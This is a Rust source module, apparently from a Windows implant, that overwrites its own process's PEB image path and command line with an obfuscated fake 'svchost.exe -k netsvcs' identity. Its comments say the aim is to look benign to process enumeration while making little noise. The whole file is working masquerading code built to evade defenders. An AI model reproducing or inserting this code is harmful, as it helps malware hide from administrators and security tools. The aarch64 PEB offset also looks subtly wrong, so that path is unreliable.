//! Mask the process image path and command line in the PEB, so casual
//! process enumeration (and tools reading RTL_USER_PROCESS_PARAMETERS)
//! report a benign looking binary. Low noise: no hooks, no foreign
//! process writes — only our own process memory.

fn fake_path() -> String {
    crate::ob!(r"C:\Windows\System32\svchost.exe")
}
fn fake_cmd() -> String {
    crate::ob!(r#""C:\Windows\System32\svchost.exe" -k netsvcs -p -s sppsvc"#)
}

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct CurDir {
    DosPath: UnicodeString,
    Handle: usize,
}

#[cfg(target_arch = "x86_64")]
#[repr(C)]
#[allow(non_snake_case)]
struct RtlUserProcessParameters {
    MaximumLength: u32,
    Length: u32,
    Flags: u32,
    DebugFlags: u32,
    ConsoleHandle: usize,
    ConsoleFlags: u32,
    _pad0: u32, // alignment before the HANDLE triple on x64
    StandardInput: usize,
    StandardOutput: usize,
    StandardError: usize,
    CurrentDirectory: CurDir,
    DllPath: UnicodeString,
    ImagePathName: UnicodeString,
    CommandLine: UnicodeString,
}

#[cfg(not(target_arch = "x86_64"))]
#[repr(C)]
#[allow(non_snake_case)]
struct RtlUserProcessParameters {
    MaximumLength: u32,
    Length: u32,
    Flags: u32,
    DebugFlags: u32,
    ConsoleHandle: usize,
    ConsoleFlags: u32,
    StandardInput: usize,
    StandardOutput: usize,
    StandardError: usize,
    CurrentDirectory: CurDir,
    DllPath: UnicodeString,
    ImagePathName: UnicodeString,
    CommandLine: UnicodeString,
}

#[allow(non_snake_case)]
#[repr(C)]
struct Peb {
    InheritedAddressSpace: u8,
    ReadImageFileExecOptions: u8,
    BeingDebugged: u8,
    BitField: u8,
    Mutant: usize,
    ImageBaseAddress: usize,
    Ldr: usize,
    ProcessParameters: *mut RtlUserProcessParameters,
    // ... rest unused
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
fn current_peb() -> *mut Peb {
    let peb: *mut Peb;
    unsafe {
        core::arch::asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb,
            options(nostack, preserves_flags)
        );
    }
    peb
}

#[cfg(target_arch = "x86")]
#[inline(always)]
fn current_peb() -> *mut Peb {
    let peb: *mut Peb;
    unsafe {
        core::arch::asm!(
            "mov {}, fs:[0x30]",
            out(reg) peb,
            options(nostack, preserves_flags)
        );
    }
    peb
}

#[cfg(target_arch = "aarch64")]
#[inline(always)]
fn current_peb() -> *mut Peb {
    let teb: usize;
    unsafe {
        core::arch::asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, preserves_flags));
    }
    unsafe { *(teb as *const usize).add(16) as *mut Peb }
}

fn overwrite_us(us: &mut UnicodeString, value: &str) {
    unsafe {
        // Widen storage: write UTF-16 into the existing buffer if it fits,
        // otherwise silently keep the old value (never crash for cosmetics).
        let mut wide: Vec<u16> = value.encode_utf16().collect();
        wide.push(0);
        let cap_bytes = us.maximum_length as usize;
        let need_bytes = wide.len() * 2;
        // Buffer must be writable; PEB strings are in our own heap already.
        if need_bytes <= cap_bytes && !us.buffer.is_null() {
            let dst = core::slice::from_raw_parts_mut(us.buffer, wide.len());
            dst.copy_from_slice(&wide);
            us.length = (need_bytes - 2) as u16;
        }
    }
}

pub fn mask_process() {
    unsafe {
        let peb = current_peb();
        if peb.is_null() {
            return;
        }
        let params = (*peb).ProcessParameters;
        if params.is_null() {
            return;
        }
        overwrite_us(&mut (*params).ImagePathName, &fake_path());
        overwrite_us(&mut (*params).CommandLine, &fake_cmd());
    }
}
